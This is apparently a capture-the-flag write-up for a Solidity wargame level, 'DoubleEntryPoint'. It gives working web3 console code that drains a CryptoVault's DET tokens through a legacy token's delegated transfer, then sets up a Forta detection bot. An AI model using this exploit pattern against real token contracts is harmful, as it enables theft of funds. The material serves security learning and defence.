# Find exploit and secure vault

## What can be exploited?
The contract contains two token: DET & LGT. The `transfer` on LGT token uses `delegateTransfer` method of `DelegateERC20` which implement on the underlying DET token.
```
function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
```
We can check this by comparing the storage address of DET token and `call` the function `delegatedFrom` to find what address its calling :
```
// find the CryptoVault address from DoubleEntryPoint
const cryptoVaultAddress = await contract.cryptoVault()
// access "IERC20 public underlying;" variable
await web3.eth.getStorageAt(cryptoVaultAddress, 1)

/*-----------------------------------------*/

// find the LegacyToken address from DoubleEntryPoint
const legacyTokenAddress = await contract.delegatedFrom()
// call the getter of "DelegateERC20 public delegate;"
await web3.eth.call({
  from: player,
  to: legacyTokenAddress,
  data: '0xc89e4361' // delegate()
})
```
Their output address should be the same. Which means we can indirectly sweep DET token through `transfer` of LGT token by calling `sweepToken` with LGT token address:
```
vault = await contract.cryptoVault()

// Check initial balance (100 DET)
await contract.balanceOf(vault).then(v => v.toString()) // '100000000000000000000'

legacyToken = await contract.delegatedFrom()

// sweepTokens(..) function call data
sweepSig = web3.eth.abi.encodeFunctionCall({
    name: 'sweepToken',
    type: 'function',
    inputs: [{name: 'token', type: 'address'}]
}, [legacyToken])

// Send exploit transaction
await web3.eth.sendTransaction({ from: player, to: vault, data: sweepSig })

// Check balance (0 DET)
await contract.balanceOf(vault).then(v => v.toString()) 
// '0'
```

## How to secure it with Forta?
Through this tutorial, we can write a Forta bot contract that raise an alert if the `origSender` param is CryptoVault's address. 

We deploy the Forta bot contract to "Vault" address:
```
// Get vault contract address
vault = await contract.cryptoVault()

```
Once deployed, we set the bot in console terminal:
```
// FortaDetectionBot
botAddy = '<YOUR_FORTA_BOT_CONTRACT_ADDRESS>'

// Forta contract address
forta = await contract.forta()

// set bot detection contract function call
setBotSig = web3.eth.abi.encodeFunctionCall({
    name: 'setDetectionBot',
    type: 'function',
    inputs: [
        { type: 'address', name: 'detectionBotAddress' }
    ]
}, [botAddy])

// Send the transaction setting the bot
await web3.eth.sendTransaction({from: player, to: forta, data: setBotSig })
```